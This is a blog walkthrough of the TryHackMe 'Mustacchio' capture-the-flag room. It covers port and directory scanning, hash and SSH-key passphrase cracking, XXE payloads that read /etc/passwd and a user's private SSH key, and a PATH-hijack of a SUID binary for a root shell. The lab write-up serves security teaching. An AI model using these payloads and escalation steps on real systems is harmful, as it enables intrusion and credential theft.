---
layout: post
title: TryHackMe Walkthrough - Mustacchio
date: 2021-06-24
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Easy
permalink: /2021/06/Mustacchio
img: 2021/06/Mustacchio/Mustacchio.png
---

This is an easy room where you need to exploit a web application to get access to the server. Then escalate to root.

* Room: Mustacchio
* Difficulty: Easy
* URL: [https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)
* Author: [zyeinn](https://tryhackme.com/p/zyeinn)

```
Easy boot2root Machine

Deploy and compromise the machine!
```


## Enumeration

I started by running nmap to look for opened ports.

```bash
$ nmap -A -oN nmap.txt target
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I also ran a scan all on ports.
```bash
$ nmap -sS -p- -oN nmapFull.txt target
# Nmap 7.91 scan initiated Thu Jun 24 11:55:58 2021 as: nmap -sS -p- -oN nmapFull.txt target
Nmap scan report for target (10.10.253.172)
Host is up (0.24s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

# Nmap done at Thu Jun 24 12:01:47 2021 -- 1 IP address (1 host up) scanned in 349.77 seconds
```

There are three ports opened: 22 (SSH), 80 (HTTP), and the non standard port 8765.

After scanning for ports, I looked for hidden files and folder on the web server.

```bash
$ gobuster dir -e -u http://target/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/24 11:54:10 Starting gobuster in directory enumeration mode
===============================================================
http://target/.hta                 (Status: 403) [Size: 271]
http://target/.htaccess            (Status: 403) [Size: 271]
http://target/.htpasswd            (Status: 403) [Size: 271]
http://target/custom               (Status: 301) [Size: 301] [--> http://target/custom/]
http://target/fonts                (Status: 301) [Size: 300] [--> http://target/fonts/] 
http://target/images               (Status: 301) [Size: 301] [--> http://target/images/]
http://target/index.html           (Status: 200) [Size: 1752]
http://target/robots.txt           (Status: 200) [Size: 28]
http://target/server-status        (Status: 403) [Size: 271]
```

## Finding Credentials

I looked at the web site. It does not do much. There is a contact form. I looked at it briefly, but did not see anything obvious. And I found my way in the server before I felt the need to come back to it.

![Main Site](/assets/images/2021/06/Mustacchio/01_mainSite.png "Main Site")

Gobuster found a [/custom/](http://target/custom/) folder. In it there was a `js` folder that contained a file called `users.bak`. 

I downloaded the file and checked what it contained. 

```bash
$ file users.bak 
users.bak: SQLite 3.x database, last written using SQLite version 3034001
```

A SQLite database, lets look at it. 

```bash
$ sqlite3 users.bak
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.

sqlite> .tables
users

sqlite> Select * From users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

It had some credentials with the password hashed with SHA1. I saved the password to a file and used hashcat to crack it.

```bash
$ cat hash.txt 
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

$ hashcat -a 0 -m 100 hash.txt /usr/share/wordlists/rockyou.txt

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:REDACTED
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA1
Hash.Target......: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Time.Started.....: Thu Jun 24 12:02:54 2021 (1 sec)
Time.Estimated...: Thu Jun 24 12:02:55 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2178.4 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 686080/14344385 (4.78%)
Rejected.........: 0/686080 (0.00%)
Restore.Point....: 684032/14344385 (4.77%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: bultaco -> boylover16

Started: Thu Jun 24 12:02:53 2021
Stopped: Thu Jun 24 12:02:57 2021
```

I tried using it to connect to the server by SSH, but I got rejected immediately. It required an SSH key to connected. 

## Admin Panel

I had credentials, but I did not know where to use them. I looked at what was behind port 8765. It had an [admin panel](http://target.thm:8765/). 

![Admin Panel](/assets/images/2021/06/Mustacchio/02_AdminPanel.png "Admin Panel")

I used the credentials I just found and they worked. I looked at the page source, it had a comment about using an SSH key to connect.

```html
<!-- Barry, you can now SSH in using your key!-->
```

Once connected, the site gave me a text field to enter a comment. When I submitted an empty comment, it asked me to enter some XML. This looks like it might be vulnerable to [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing). 

![Enter XML](/assets/images/2021/06/Mustacchio/03_InsertXML.png "Enter XML")

I tried sending it some XML, the name and author fields where reflected back to me.

![XML](/assets/images/2021/06/Mustacchio/04_XML.png "XML")

I next tried to read a file using an XML entity. 

When I sent this XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<root><name>1</name><author>&xxe;</author></root>
```

I got this back from the server:
```
Author : root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

This confirmed that the server had a user called barry. 

I then tried to read the user flag from their home folder. This XML payload gave me the first flag.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///home/barry/user.txt" >]>
<root><name>1</name><author>&xxe;</author></root>
```

Next, I used the same vulnerability to extract their SSH key. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///home/barry/.ssh/id_rsa" >]>
<root><name>1</name><author>&xxe;</author></root>
```

I save the key to a file on my machine and tried to use it to connect to the server.

```bash
$ chmod 600 id_rsa
ehogue@kali:~/Kali/OnlineCTFs/TryHackMe/Mustacchio$ ssh barry@target -i id_rsa 
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
barry@target: Permission denied (publickey).
```

The key is password protected, and the password found before did not work. So I used John to brute force it.

```bash
$ python2 /usr/share/john/ssh2john.py id_rsa > john.hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt john.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED       (id_rsa)
1g 0:00:00:05 DONE (2021-06-24 12:34) 0.1727g/s 2476Kp/s 2476Kc/s 2476KC/sa6_123..*7¡Vamos!
Session completed
```

With the password cracked, I could then use the key to connect to the server.

```bash
$ ssh barry@target -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ 
```

## Getting Root

I already had the user flag, so I tried to escalate to root. 

I looked for files with [SUID](https://blog.tryhackme.com/linux-privilege-escalation-suid/) set. 

```bash
barry@mustacchio:~$ find / -perm /u=s 2>/dev/null 
...
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
...
```

The `live_log` file in joe's home folder looked interesting. 

```bash
barry@mustacchio:~$ ls -la /home/joe/live_log 
-rwsr-xr-x 1 root root 16832 Jun 12 15:48 /home/joe/live_log


barry@mustacchio:~$ strings /home/joe/live_log
/lib64/ld-linux-x86-64.so.2
libc.so.6            
setuid        
printf                                
system            
__cxa_finalize                
setgid   
GLIBC_2.2.5         
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
...
```

It called tail, without providing the full path. So if I created an executable file called `tail` that was in my PATH, it would get executed as root. 

```bash
barry@mustacchio:~$  export PATH=/home/barry/:$PATH

barry@mustacchio:~$ cat tail
#!/bin/bash
/bin/bash -p

barry@mustacchio:~$ chmod +x tail
```

With the file created and in my PATH, when I ran live_log, my file was executed and I had a shell as root.

```bash
barry@mustacchio:~$ /home/joe/live_log 

root@mustacchio:~# whoami
root

root@mustacchio:~# cat /root/root.txt 
REDACTED
```
